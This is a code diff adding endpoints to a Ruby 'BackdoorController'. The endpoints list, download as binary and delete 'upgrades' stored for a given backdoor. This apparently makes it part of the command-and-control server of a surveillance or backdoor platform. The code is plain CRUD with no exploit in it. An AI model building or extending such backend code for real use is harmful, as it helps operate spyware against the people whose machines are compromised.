@@ -74,6 +74,34 @@ class BackdoorController < RESTController
     return STATUS_OK
   end
 
+  # retrieve the list of upgrade for a given backdoor
+  def upgrades
+    require_auth_level :server, :tech
+
+    list = DB.backdoor_upgrades(params[:backdoor])
+
+    return STATUS_OK, *json_reply(list)
+  end
+
+  # retrieve or delete a single upgrade entity
+  def upgrade
+    require_auth_level :server, :tech
+
+    request = JSON.parse(params[:backdoor])
+
+    case @req_method
+      when 'GET'
+        upgrade = DB.backdoor_upgrade(request['backdoor_id'], request['upgrade_id'])
+        trace :info, "[#{@req_peer}] Requested the UPGRADE #{request} -- #{upgrade[:content].size.to_s_bytes}"
+        return STATUS_OK, upgrade[:content], "binary/octet-stream"
+      when 'DELETE'
+        DB.backdoor_del_upgrade(request['backdoor_id'], request['upgrade_id'])
+        trace :info, "[#{@req_peer}] Deleted the UPGRADE #{request}"
+    end
+
+    return STATUS_OK
+  end
+
 end
 
 end #DB::
